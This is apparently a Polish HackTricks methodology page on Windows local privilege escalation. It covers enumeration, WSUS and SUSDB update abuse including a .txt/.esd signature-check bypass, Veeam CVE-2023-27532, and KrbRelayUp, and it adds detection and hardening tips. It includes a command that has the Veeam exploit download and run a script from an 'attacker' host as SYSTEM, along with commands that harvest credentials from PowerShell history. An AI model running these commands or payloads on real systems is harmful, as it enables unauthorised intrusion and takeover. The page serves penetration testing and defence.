# Lokalna eskalacja uprawnień w Windows

{{#include ../../banners/hacktricks-training.md}}

### **Najlepsze narzędzie do wyszukiwania wektorów lokalnej eskalacji uprawnień w Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Ta strona zbiera ogólną metodykę eskalacji uprawnień w Windows z kilku podstawowych poradników.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Praktyczny proces enumeracji uwzględnia również materiały z warsztatów społecznościowych i list kontrolnych.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Materiały dotyczące historycznych ataków obejmują prezentację DerbyCon poświęconą eskalacji uprawnień w Windows.<sup>[[5]](#references)</sup>

## Podstawy działania Windows

### Access Tokens

**Jeśli nie wiesz, czym są access tokens w Windows, przed dalszą lekturą zapoznaj się z następującą stroną:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Więcej informacji o ACLs - DACLs/SACLs/ACEs znajdziesz na następującej stronie:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Poziomy integralności

**Jeśli nie wiesz, czym są poziomy integralności w Windows, przed dalszą lekturą zapoznaj się z następującą stroną:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Mechanizmy zabezpieczeń Windows

W Windows istnieją różne mechanizmy, które mogą **uniemożliwić enumerację systemu**, uruchamianie plików wykonywalnych, a nawet **wykrywać Twoje działania**. Przed rozpoczęciem enumeracji na potrzeby eskalacji uprawnień **przeczytaj** następującą **stronę** i **wylicz** wszystkie te **mechanizmy obronne**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Fizyczny dostęp może również umożliwić wykorzystanie edycji UEFI NVRAM w trybie offline do przeprowadzenia DMA przed rozruchem, a następnie zmodyfikowania pamięci Windows w łańcuchu ataku:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Ochrona administratora / cicha eskalacja UIAccess

Procesy UIAccess uruchomione przez `RAiLaunchAdminProcess` można wykorzystać do uzyskania High IL bez monitów, jeśli uda się ominąć kontrole bezpiecznej ścieżki AppInfo. Dedykowany proces omijania UIAccess/Admin Protection znajdziesz tutaj:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Można wykorzystać propagację wpisów rejestru dostępności Secure Desktop do wykonania dowolnego zapisu w rejestrze jako SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Nowsze kompilacje Windows wprowadziły również ścieżkę LPE wykorzystującą **dowolny port SMB**, w której uprzywilejowane lokalne uwierzytelnienie NTLM jest przekazywane przez ponownie użyte połączenie TCP SMB:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Informacje o systemie

### Enumeracja informacji o wersji

Sprawdź, czy dana wersja Windows ma znane podatności (sprawdź również zastosowane poprawki).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploity zależne od wersji

Ta [witryna](https://msrc.microsoft.com/update-guide/vulnerability) jest przydatna do wyszukiwania szczegółowych informacji o lukach w zabezpieczeniach Microsoft. Ta baza danych zawiera ponad 4 700 luk, co pokazuje **ogromną powierzchnię ataku**, jaką stanowi środowisko Windows.

**W systemie**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ma wbudowany watson)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — zbiera informacje o kompilacji systemu operacyjnego, zainstalowanych aktualizacjach i wybranych potencjalnie pasujących biuletynach; przed uznaniem wyniku za mający zastosowanie sprawdź dokładny produkt i zastępujące aktualizacje.

W przypadku lokalnego exploita zależnego od wersji sprawdź **architekturę uruchomionego procesu**, a także architekturę systemu operacyjnego. W 64-bitowym systemie Windows 32-bitowy proces podlega [przekierowaniu systemu plików WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` zwykle wskazuje katalog systemowy 32-bitowy, natomiast `%windir%\Sysnative` umożliwia temu procesowi dostęp do natywnego katalogu systemowego. Ten alias jest niedostępny dla procesu 64-bitowego. Kompilacja systemu operacyjnego ani potencjalnie brakująca aktualizacja KB nie dowodzą podatności na exploit; porównaj uruchomioną kompilację, zainstalowaną lub zastępującą aktualizację, architekturę procesu i wymagania exploita z [biuletynem bezpieczeństwa Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) dotyczącym konkretnego problemu.

Przykład korupcji pamięci usługi znajdziesz w opisie [offsetów pierścienia pamięci współdzielonej MIDI kontrolowanych przez klienta](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions). Opublikowane offsety stosu dotyczą wyłącznie testowanej kompilacji; uzyskanie uprawnień `LOCAL SERVICE` to osobny etap od późniejszego użycia [SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md) w celu uzyskania `SYSTEM`.<sup>[[44]](#references)</sup>

**Lokalnie, na podstawie informacji o systemie**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repozytoria exploitów na Githubie:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Środowisko

Czy w zmiennych środowiskowych zapisano jakieś dane uwierzytelniające lub inne poufne informacje?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Historia PowerShella

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Pliki transkrypcji PowerShell

Możesz dowiedzieć się, jak to włączyć, tutaj: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` to tylko przykład. [Zasady transkrypcji PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) zwykle zapisują pliki w folderze Documents każdego użytkownika, ale ustawienie `OutputDirectory` lub `Start-Transcript -OutputDirectory` może przekierować je do folderu współdzielonego lub ukrytego. Przed sprawdzeniem transkrypcji zweryfikuj efektywną ścieżkę zapisu i uprawnienia ACL do pliku: transkrypcja może zawierać argumenty poleceń i ich wyniki, w tym dane uwierzytelniające. Dostępna do odczytu transkrypcja jest wskazówką tylko wtedy, gdy jej zawartość ujawnia możliwą do wykorzystania tożsamość o wyższych uprawnieniach, która może zalogować się w odpowiednim kontekście.

### Rejestrowanie modułów PowerShell

Rejestrowane są szczegóły wykonywania potoku PowerShell, w tym uruchomione polecenia, ich wywołania oraz części skryptów. Pełne szczegóły wykonania i wyniki mogą jednak nie zostać zarejestrowane.

Aby włączyć tę funkcję, postępuj zgodnie z instrukcjami w sekcji „Transcript files” dokumentacji, wybierając **„Module Logging”** zamiast **„Powershell Transcription”**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Aby wyświetlić 15 ostatnich zdarzeń z logów PowerShell, możesz wykonać:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Rejestrowany jest pełny przebieg działania skryptu wraz z całą treścią jego wykonania, dzięki czemu każdy blok kodu jest dokumentowany w trakcie działania. Proces ten zapewnia kompleksowy ślad audytowy wszystkich działań, przydatny w analizie śledczej i badaniu złośliwego zachowania. Dokumentowanie wszystkich działań w chwili ich wykonywania pozwala uzyskać szczegółowy wgląd w przebieg procesu.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Zdarzenia rejestrowania dla Script Block można znaleźć w Podglądzie zdarzeń systemu Windows w lokalizacji: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Aby wyświetlić 20 ostatnich zdarzeń, możesz użyć:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Ustawienia internetowe

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Dyski

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Wcześniejsze wskazówki podsumowywały ryzyko w następujący sposób:

Możesz przejąć kontrolę nad systemem, jeśli aktualizacje są pobierane przez http, a nie http**S**.

Punkt końcowy WSUS korzystający z HTTP jest wskazówką, by sprawdzić możliwość przechwycenia metadanych aktualizacji. Wykorzystanie tej podatności zależy również od tego, czy klient korzysta z tego serwera WSUS, czy atakujący może przechwytywać lub kontrolować jego ruch oraz od ustawień zaufania i instalowania aktualizacji na kliencie. Sam adres URL nie oznacza, że możliwe jest wykonanie kodu. [Microsoft zaleca używanie TLS do przesyłania metadanych WSUS](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Zacznij od sprawdzenia, czy sieć korzysta z aktualizacji WSUS przez połączenie inne niż SSL, uruchamiając w cmd następujące polecenie:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Lub poniższe polecenie w PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Jeśli otrzymasz odpowiedź podobną do jednej z tych:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

A jeśli `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` lub `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` jest równe `1`.

Pierwotne stwierdzenie dotyczące warunków zastosowania brzmiało:

Wtedy **można to wykorzystać.** Jeśli ostatni wpis rejestru ma wartość `0`, wpis WSUS zostanie zignorowany.

Gdy `UseWUServer` ma wartość `1`, Windows Update korzysta ze skonfigurowanej usługi intranetowej. Potwierdza to spełnienie warunku wstępnego dla ścieżki przechwytywania ruchu HTTP, ale nie dowodzi, że możliwe jest przechwycenie ruchu, zaakceptowanie złośliwej aktualizacji ani jej instalacja z podwyższonymi uprawnieniami. Gdy ma wartość `0`, ta konkretna skonfigurowana usługa WSUS nie jest wybierana przez tę zasadę.

Aby wykorzystać te podatności, możesz użyć narzędzi takich jak [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — to uzbrojone skrypty exploitów MiTM służące do wstrzykiwania „fałszywych” aktualizacji do ruchu WSUS bez SSL.

Tutaj znajdziesz badania:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Przeczytaj pełny raport tutaj**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Zasadniczo na tej luce polega ten exploit:

> Jeśli możemy zmienić proxy lokalnego użytkownika, a Windows Updates korzysta z proxy skonfigurowanego w ustawieniach Internet Explorera, możemy lokalnie uruchomić [PyWSUS](https://github.com/GoSecure/pywsus), aby przechwycić własny ruch i uruchomić kod z podwyższonymi uprawnieniami na naszym komputerze.
>
> Ponadto, ponieważ usługa WSUS korzysta z ustawień bieżącego użytkownika, używa również jego magazynu certyfikatów. Jeśli wygenerujemy certyfikat z podpisem własnym dla nazwy hosta WSUS i dodamy go do magazynu certyfikatów bieżącego użytkownika, będziemy mogli przechwytywać zarówno ruch HTTP, jak i HTTPS WSUS. WSUS nie korzysta z mechanizmów podobnych do HSTS, które implementowałyby walidację certyfikatu typu trust-on-first-use. Jeśli certyfikat jest zaufany przez użytkownika i ma prawidłową nazwę hosta, usługa go zaakceptuje.

Możesz wykorzystać tę podatność za pomocą narzędzia [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (gdy zostanie udostępnione).

### Aktualizacje WSUS kontrolowane przez administratora

Istnieje osobna ścieżka, gdy bieżąca tożsamość może **publikować i zatwierdzać** aktualizacje na serwerze WSUS. Sprawdź efektywne członkostwo w grupie `WSUS Administrators` na serwerze oraz wszelkie delegowane uprawnienia WSUS, a następnie ustal grupę komputerów klienckich, do której trafiłaby zatwierdzona aktualizacja. [Microsoft wymaga uprawnień administratora WSUS do zatwierdzania aktualizacji](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) i [opisuje relację zaufania dotyczącą publikowania](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): klienci muszą ufać certyfikatowi podpisującemu używanemu do publikowania lokalnej zawartości. Zanim uznasz tę ścieżkę za eskalację uprawnień, potwierdź, że proponowana aktualizacja jest podpisana i akceptowana, dotyczy celu oraz jest instalowana w kontekście o wyższych uprawnieniach. Sama wartość HTTP `WUServer` ani nazwa grupy nie potwierdzają spełnienia tych warunków.

### Nadużycie niestandardowych aktualizacji SUSDB: niepodpisane payloady przez `.txt`/`.esd`

To inny przypadek naruszenia granicy zaufania niż przechwycenie połączenia HTTP WSUS: warunkiem wstępnym jest dostęp do **procedur składowanych bazy WSUS (`SUSDB`)** wystarczający do opublikowania i zatwierdzenia niestandardowej aktualizacji. Jedną z praktycznych ścieżek uzyskania dostępu jest przekazanie uwierzytelnienia konta komputera upstreamowego serwera WSUS do osobnego serwera MSSQL hostującego `SUSDB`; dokładne warunki wstępne zależą od wdrożenia, dlatego najpierw wylicz uprawnienia `EXECUTE`, zamiast zakładać, że wymagane są uprawnienia administratora SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Informacje o osobnej ścieżce ataku, która przekazuje uwierzytelnienie klientów WSUS z HTTP/8530 do LDAP, SMB lub AD CS, znajdziesz w artykule [Nadużywanie HTTP WSUS do przekazywania NTLM](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Potwierdź przekazywanie uwierzytelnienia do zewnętrznej bazy danych i uprawnienia do procedur

W środowiskach, w których WSUS korzysta z zewnętrznego serwera SQL Server, najpierw sprawdź, czy konto serwera WSUS może uwierzytelnić się w bazie danych i czy przekazywanie NTLM dociera do tego listenera. Rola SQL serwera może udostępniać procedury publikowania aktualizacji, nawet jeśli bezpośredni zapis do tabel jest zablokowany; nieudana instrukcja `UPDATE` w `SUSDB` nie dowodzi, że publikowanie jest zablokowane. Przed próbą opublikowania niestandardowej aktualizacji sprawdź efektywną tożsamość, członkostwo w rolach i uprawnienia do procedur w autoryzowanej sesji SQL.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Bieżące definicje procedur i zainstalowany plik `SoftwareDistributionPackage.xsd` są przydatne przy odtwarzaniu prawidłowych metadanych aktualizacji. Zarówno nadrzędny element bundle, jak i podrzędny element payload wymagają `UpdateIdentity` (typ fragmentu `1`), `LocalizedProperties` (`4`) oraz `ExtendedProperties` (`2`); zapisz lokalny identyfikator rewizji zwrócony przez każde wywołanie `spImportUpdate` i zachowaj spójność relacji bundle, skrótów, rozmiaru, adresu URL zawartości i rewizji. Jest to przepływ publikowania zależny od stanu, więc pojedyncze pomyślne wywołanie procedury składowanej nie dowodzi wykonania po stronie klienta.<sup>[[38]](#references)</sup>

#### Utwórz, skieruj i zatwierdź aktualizację

Przepływ pracy dla niestandardowych aktualizacji wykorzystuje prawidłowe procedury WSUS jako ograniczone API publikowania. Istotne zmiany stanu to:<sup>[[38]](#references)</sup>

| Etap | Odpowiednie procedury składowane |
| --- | --- |
| Import metadanych aktualizacji | `spImportUpdate` |
| Zapisanie fragmentów XML z wymaganiami wstępnymi, zlokalizowanych i rozszerzonych | `spSaveXMLFragment` |
| Powiązanie skrótu zawartości z kontrolowanym przez atakującego adresem URL | `spSetBatchURL` |
| Wyliczenie/utworzenie grupy komputerów i dodanie klienta | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Zatwierdzenie instalacji dla tej grupy | `spDeployUpdate` z `@actionID = 0` i `@isAssigned = 1` |

Nazwa pliku, skróty, rozmiar i procedura obsługi `CommandLineInstallation` muszą być zgodne w zaimportowanych metadanych i fragmentach. Po przypisaniu adresu URL zawartości i grupy docelowej końcowe zatwierdzenie wygląda podobnie do poniższego; użyj nowych identyfikatorów aktualizacji, grupy i wdrożenia zamiast ponownie wykorzystywać przykładowe GUID-y.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Ominięcie weryfikacji podpisu oparte na rozszerzeniu

WSUS zwykle odrzuca dowolną niepodpisaną zawartość wykonywalną. Jednak w pliku `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` ścieżka .NET `VerifyFile` ustawia flagę sprawdzania certyfikatu na false, gdy podana nazwa pliku kończy się na `.txt` lub `.esd`; `CheckCertificateSignature` zostaje wtedy pominięte bez uprzedniego sprawdzenia, czy bajty zawierają tekst lub prawidłowy obraz ESD. W efekcie niezmieniony plik PE o nazwie na przykład `payload.exe.txt` może przejść weryfikację zawartości, a następnie zostać uruchomiony przez procedurę obsługi instalacji z wiersza poleceń aktualizacji. To błąd pomylenia typu i polityki, a nie fałszowanie podpisu.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Staging i automatyzacja zgodne z BITS

Wywołanie `spDeployUpdate` powoduje, że WSUS pobiera zarejestrowaną zawartość. Serwer źródłowy musi spełniać wymagania HTTP protokołu BITS: sam dostępny URL nie wystarczy, ponieważ transfer obejmuje początkowy przepływ `HEAD`/`GET` oraz żądania zakresów bajtów. Serwer bez obsługi Range powoduje błąd synchronizacji WSUS `EventId=364` z informacją, że BITS wymaga nagłówka protokołu Range.<sup>[[39]](#references)</sup>

Badawczy PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) generuje kod SQL wymagany dla łańcucha importu/fragmentu/URL/grupy/wdrożenia, zawiera zmodyfikowanego klienta MSSQL do jego wykonania oraz udostępnia `BitsWebServer.py` do stagingu zawartości. Minimalne wywołanie w autoryzowanym labie:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Wykonywanie bez nadzoru i persistence przez ponawianie

Interakcja po stronie klienta zależy od zasad. Ustawienie `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, opcja `4 - Auto download and schedule install`, sprawia, że zatwierdzona aktualizacja jest pobierana i instalowana zgodnie ze skonfigurowanym harmonogramem, bez ręcznego wyboru przez użytkownika. Podczas testów payload, którego aktualizacja pozostała w stanie niepowodzenia lub nieukończenia, był ponownie oferowany natychmiast po zakończeniu procesu callback, więc ponawianie może stać się cyklicznym persistence; jest to głośne, ponieważ klient pokazuje stan niepowodzenia aktualizacji.<sup>[[39]](#references)</sup>

#### Wskazówki dotyczące wykrywania i hardeningu

Przydatne wskazówki po stronie serwera i klienta wynikające z tego łańcucha to:<sup>[[39]](#references)</sup>

- Audytuj wykonywanie `spCreateTargetGroup`, `spSetBatchURL` i `spDeployUpdate` w `SUSDB`; sprawdzaj nowe grupy docelowe, zewnętrzne źródła treści, payloady aktualizacji `.txt`/`.esd` oraz wdrożenia wykonywane przez nieoczekiwane podmioty (zwłaszcza konta inne niż komputerowe).
- Sprawdzaj `C:\Program Files\Update Services\LogFiles` pod kątem `ContentSyncAgent`, `FileVerified`, błędnie zapisanej nazwy `FileVerficationFailed` i `EventId=364`; koreluj weryfikację z rozszerzeniem payloadu i sygnaturą pliku, zamiast ufać rozszerzeniu.
- Wyszukuj wielokrotne niepowodzenia i ponowienia instalacji Windows Update, a także wykonanie PE lub nieoczekiwaną aktywność procesów potomnych i sieciową z treści o nazwach z rozszerzeniami `.txt` lub `.esd`.
- Tam, gdzie jest to obsługiwane, wymagaj Extended Protection for Authentication dla usługi bazy danych i ogranicz dostęp sieciowy do bazy danych do serwera WSUS oraz autoryzowanych systemów administracyjnych. Ogranicz i audytuj uprawnienia `EXECUTE` do procedur niestandardowych aktualizacji.

## Zewnętrzne programy Auto-Updaters i Agent IPC (local privesc)

Wiele agentów korporacyjnych udostępnia lokalny interfejs IPC i uprzywilejowany kanał aktualizacji. Jeśli rejestrację można wymusić na serwerze atakującego, a program aktualizujący ufa fałszywemu głównemu CA lub stosuje słabe kontrole podpisu, lokalny użytkownik może dostarczyć złośliwy plik MSI, który zainstaluje usługa SYSTEM. Uogólnioną technikę (opartą na łańcuchu Netskope stAgentSvc – CVE-2025-0309) opisano tutaj:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM przez TCP 9401)

Oryginalny opis dotyczący konkretnych wersji oraz notatka rozpoznawcza brzmiały:

Veeam B&R < `11.0.1.1261` udostępnia lokalną usługę na **TCP/9401**, która przetwarza kontrolowane przez atakującego wiadomości, umożliwiając wykonanie dowolnych poleceń jako **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup>

- **Rozpoznanie**: potwierdź nasłuchiwanie i wersję, np. za pomocą `netstat -ano | findstr 9401` oraz `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.

Veeam Backup & Replication i Cloud Connect domyślnie używają podstawowej usługi kopii zapasowych na **TCP/9401**. [Poradnik Veeam](https://www.veeam.com/kb4424) opisuje nieuwierzytelnione ujawnienie zaszyfrowanych poświadczeń bazy danych konfiguracji w obrębie sieci kopii zapasowych; odrębny publiczny PoC demonstruje ścieżkę wykonania poleceń jako **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Usługa może nasłuchiwać nie tylko na localhost, dlatego sprawdź jej rzeczywisty adres i PID.

- **Rozpoznanie**: potwierdź, że TCP/9401 należy do `Veeam.Backup.Service.exe`, a następnie sprawdź zainstalowany produkt i metadane poprawek. `netstat -ano | findstr 9401` oraz `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` to wskazówki, a nie pełna weryfikacja poprawek.
- **Wersje z poprawką**: Veeam wskazuje **11a build 11.0.1.1261 P20230227** i **12 build 12.0.0.1420 P20230223** jako pierwsze wydania z poprawką; wcześniejsze wydania są podatne. Czteroczęściowy numer wersji pliku nie wystarczy, by odróżnić niezałataną wersję bazową od późniejszej poprawki dla tych samych numerów buildów. Przed uznaniem granicznego buildu za naprawiony zweryfikuj identyfikator poprawki w [historii buildów dostawcy](https://www.veeam.com/kb2680).
- **Exploit**: umieść PoC, taki jak `VeeamHax.exe`, wraz z wymaganymi bibliotekami DLL Veeam w tym samym katalogu, a następnie wywołaj payload SYSTEM przez lokalne gniazdo:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Usługa wykonuje polecenie jako SYSTEM.

Cytowany PoC demonstruje wykonanie polecenia jako SYSTEM, gdy spełnione są dodatkowe warunki wstępne; advisory dostawcy opisuje problem ujawnienia poświadczeń.

## KrbRelayUp

Pierwotny opis domyślnej konfiguracji środowiska brzmiał:

W środowiskach domenowych Windows występuje podatność umożliwiająca **lokalną eskalację uprawnień** w określonych warunkach. Obejmują one środowiska, w których **podpisywanie LDAP nie jest wymuszane,** użytkownicy mają uprawnienia self-rights pozwalające im konfigurować **Resource-Based Constrained Delegation (RBCD)**, a użytkownicy mogą tworzyć komputery w domenie. Należy zauważyć, że te **wymagania** są spełnione przy użyciu **ustawień domyślnych**.

Lokalny Kerberos relay może umożliwić przejście od logowania z niższymi uprawnieniami do uprzywilejowanego zapisu w katalogu, jeśli odpowiedni serwer COM uwierzytelni się, a przekazana tożsamość ma uprawnienia do modyfikacji obiektu docelowego. [Dokumentacja KrbRelay](https://github.com/cube0x0/KrbRelay) opisuje zarówno zapisy LDAP RBCD, jak i `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp automatyzuje niektóre z tych ścieżek. Łańcuch RBCD wymaga odpowiednich uprawnień delegowania i uprawnień do obiektu docelowego, natomiast łańcuch shadow-credential wymaga uprawnień do zapisu kluczy poświadczeń oraz kontrolera KDC obsługującego ścieżkę uwierzytelniania certyfikatem. Żadna z tych ścieżek nie wynika z samego członkostwa w domenie.

Sprawdź faktyczne zasady kontrolera DC dotyczące [podpisywania LDAP](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) i [LDAP channel binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), ACL obiektu dla przekazywanej tożsamości oraz poziomy uwierzytelniania i personifikacji wybranej klasy COM. Znaczenie mają typ logowania wywołującego i kontekst poświadczeń: sesja WinRM może zachowywać się inaczej niż logowanie interaktywne lub logowanie z nowymi poświadczeniami. Wynik mogą też zmienić reguły zapory, routing OXID i zainstalowane aktualizacje. Traktuj liberalną politykę lub pasujący ACL jako element wymagający weryfikacji; pasywna enumeracja nie powinna uruchamiać wymuszenia COM, uwierzytelniania relay ani zapisów w katalogu. Shadow credential konta komputera może prowadzić do uzyskania biletu komputera, a następnie — tylko jeśli to konto ma wymagane uprawnienia do replikacji katalogu — do osobnej ścieżki DCSync.

Znajdź **exploit w** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Więcej informacji o przebiegu ataku znajdziesz tutaj: [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

